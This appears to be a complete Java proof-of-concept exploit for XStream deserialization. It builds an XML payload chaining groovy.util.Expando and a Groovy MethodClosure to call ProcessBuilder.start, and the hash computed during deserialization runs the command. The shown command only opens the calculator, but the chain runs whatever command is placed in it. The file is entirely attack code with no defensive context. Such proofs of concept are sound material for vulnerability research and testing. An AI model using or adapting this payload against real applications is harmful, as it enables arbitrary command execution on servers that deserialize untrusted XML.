import com.thoughtworks.xstream.XStream;

public class TestPayload {
    public static void main(String[] args) {
        String payload = "<map>\n" +
                "  <entry>\n" +
                "    <groovy.util.Expando>\n" +
                "      <expandoProperties>\n" +
                "        <entry>\n" +
                "          <string>hashCode</string>\n" +
                "          <org.codehaus.groovy.runtime.MethodClosure>\n" +
                "            <delegate class=\"java.lang.ProcessBuilder\">\n" +
                "              <command>\n" +
                "                <string>open</string>\n" +
                "                <string>-a</string>\n" +
                "                <string>calculator</string>\n" +
                "              </command>\n" +
                "              <redirectErrorStream>false</redirectErrorStream>\n" +
                "            </delegate>\n" +
                "            <owner class=\"java.lang.ProcessBuilder\" reference=\"../delegate\"/>\n" +
                "            <resolveStrategy>0</resolveStrategy>\n" +
                "            <directive>0</directive>\n" +
                "            <parameterTypes/>\n" +
                "            <maximumNumberOfParameters>0</maximumNumberOfParameters>\n" +
                "            <method>start</method>\n" +
                "          </org.codehaus.groovy.runtime.MethodClosure>\n" +
                "        </entry>\n" +
                "      </expandoProperties>\n" +
                "    </groovy.util.Expando>\n" +
                "    <int>123</int>\n" +
                "  </entry>\n" +
                "</map>\n";

        System.out.println(payload);
        XStream xs = new XStream();
        xs.fromXML(payload);
    }
}
